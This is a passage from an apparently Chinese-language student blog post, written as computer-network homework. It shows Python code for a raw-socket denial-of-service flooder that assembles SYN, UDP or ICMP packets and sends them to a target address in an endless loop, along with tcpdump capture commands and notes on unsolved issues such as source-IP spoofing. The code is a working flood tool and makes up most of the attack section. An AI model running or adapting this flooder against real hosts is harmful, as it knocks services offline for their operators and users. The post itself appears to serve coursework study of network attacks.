<span class="comment"># generate ip segment according to the setting transport layer protocol</span></span><br><span class="line">    <span class="keyword">if</span> trsprtl == socket.IPPROTO_TCP:</span><br><span class="line">        tcp_header = self.generate_header_tcp(srcaddr, dstaddr, srcport, dstport)</span><br><span class="line">        transport_segment = tcp_header</span><br><span class="line">    <span class="keyword">elif</span> trsprtl == socket.IPPROTO_UDP:</span><br><span class="line">        <span class="comment"># the longer data udp sent, the better effect attack has</span></span><br><span class="line">        <span class="comment"># icmp will echo the data， while udp won't</span></span><br><span class="line">        <span class="comment"># so icmp has better attack effect than udp</span></span><br><span class="line">        udp_data = <span class="string">"YijunStudioYijunStudioYijunStudioYijunStudioYijunStudioYijunStudio"</span></span><br><span class="line">        udp_header = self.generate_header_udp(srcaddr, dstaddr, srcport, dstport, udp_data)</span><br><span class="line">        transport_segment = udp_header + udp_data.encode()</span><br><span class="line">    <span class="keyword">elif</span> trsprtl == socket.IPPROTO_ICMP:</span><br><span class="line">        icmp_header = self.generate_header_icmp()</span><br><span class="line">        transport_segment = icmp_header</span><br><span class="line">    <span class="comment"># the length of segment</span></span><br><span class="line">    transport_segment_size = len(transport_segment)</span><br><span class="line">    print(transport_segment_size)</span><br><span class="line">    <span class="comment"># call generate_header_ip to generate ip header</span></span><br><span class="line">    ip_header = DoS_obj.generate_header_ip(srcaddr, dstaddr, transport_segment_size, trsprtl)</span><br><span class="line">    <span class="comment"># assemble ip header and segment into a whole ip packet</span></span><br><span class="line">    dos_ip_packet = ip_header + transport_segment</span><br><span class="line">    <span class="keyword">return</span> dos_ip_packet</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h4 id="进行DoS攻击"><a href="#进行DoS攻击" class="headerlink" title="进行DoS攻击"></a>进行DoS攻击</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DoS_attack</span><span class="params">(self, dstaddr, dstport, dos_type)</span>:</span></span><br><span class="line">    dos_type = dos_type.lower()</span><br><span class="line">    <span class="keyword">if</span> dos_type == <span class="string">'syn'</span>:</span><br><span class="line">        transport_layer_protocol = socket.IPPROTO_TCP</span><br><span class="line">    <span class="keyword">elif</span> dos_type == <span class="string">'udp'</span>:</span><br><span class="line">        transport_layer_protocol = socket.IPPROTO_UDP</span><br><span class="line">    <span class="keyword">elif</span> dos_type == <span class="string">'icmp'</span>:</span><br><span class="line">        transport_layer_protocol = socket.IPPROTO_ICMP</span><br><span class="line">    <span class="comment"># build socket</span></span><br><span class="line">    dos_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, transport_layer_protocol)</span><br><span class="line">    dos_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="number">1</span>)    <span class="comment"># error line</span></span><br><span class="line">    <span class="comment"># continous packet sending</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ip_packet = self.generate_ip_packet(transport_layer_protocol)</span><br><span class="line">        client = (dstaddr, dstport)</span><br><span class="line">        dos_socket.sendto(ip_packet, client)</span><br><span class="line">        print(ip_packet)</span><br><span class="line">        print(<span class="string">f"Packet Send Success."</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># init Dos tools</span></span><br><span class="line">    DoS_obj = DoS()</span><br><span class="line">    <span class="comment"># Target IP Address</span></span><br><span class="line">    <span class="comment"># dstaddr = "192.168.43.77"</span></span><br><span class="line">    dstaddr = <span class="string">"192.168.43.21"</span></span><br><span class="line">    <span class="comment"># Target IP Port(useless when the type with icmp)</span></span><br><span class="line">    dstport = <span class="number">21</span></span><br><span class="line">    <span class="comment"># DoS type, which means which type of flood</span></span><br><span class="line">    <span class="comment"># options: syn, udp, icmp</span></span><br><span class="line">    type = <span class="string">'syn'</span></span><br><span class="line">    <span class="comment"># DO THE ATTACK</span></span><br><span class="line">    DoS_obj.DoS_attack(dstaddr, dstport, type)</span><br></pre></td></tr></table></figure>
+
+<h2 id="服务器抓包"><a href="#服务器抓包" class="headerlink" title="服务器抓包"></a>服务器抓包</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -w log.pcap</span><br></pre></td></tr></table></figure>
+
+<p>tcpdump命令抓包后，使用scp下载，后使用Wireshark本地查看。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp root@MYIPADDR:/cncourse/20201028/log.pcap /Users/reneelin/Downloads</span><br></pre></td></tr></table></figure>
+
+<h1 id="需要解决的问题"><a href="#需要解决的问题" class="headerlink" title="需要解决的问题"></a>需要解决的问题</h1><h2 id="随机IP源地址无效"><a href="#随机IP源地址无效" class="headerlink" title="随机IP源地址无效"></a>随机IP源地址无效</h2><p>在测试中间包生成过程中，可以正常输出随机IP地址，但无法在真正发送的包中查看此伪装IP，只会显示本机在局域网攻击中的IP地址，无法起到伪装的作用。</p>
+<p>不知是操作系统限制还是网络安全限制，或者是代码问题。</p>
+<h2 id="UDP包长度问题"><a href="#UDP包长度问题" class="headerlink" title="UDP包长度问题"></a>UDP包长度问题</h2><p>UDP包的长度进行了设置，为8个字节的Header加上数据长度，但是Wireshark获取的包的长度永远为1。</p>
+<h2 id="无法尝试是否真正能够进行初级DoS攻击"><a href="#无法尝试是否真正能够进行初级DoS攻击" class="headerlink" title="无法尝试是否真正能够进行初级DoS攻击"></a>无法尝试是否真正能够进行初级DoS攻击</h2><p>由于DoS攻击，特别是常用手段的DoS攻击已经被防御得比较健全，对于中小型服务器来说，是完全达不到攻击效果的，因而也没有合适的实验机可供使用，不知道实际效果如何。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Yijun Lin</span>
+                    </p>
+                
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2020 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Prepare for the WORST & Do the BEST.</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ComputerScience/"># ComputerScience</a>
+                    
+                        <a href="/tags/ComputerNetwork/"># ComputerNetwork</a>
+                    
+                        <a href="/tags/StudyNote/"># StudyNote</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/10/28/%E4%BD%9C%E4%B8%9A%E4%B8%89/">HOMEWORK | 计算机网络课程作业三</a>
+            
+            
+            <a class="next" rel="next" href="/2020/10/19/%E4%BD%9C%E4%B8%9A%E4%BA%8C/">HOMEWORK | 计算机网络课程作业二</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Yijun Lin | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
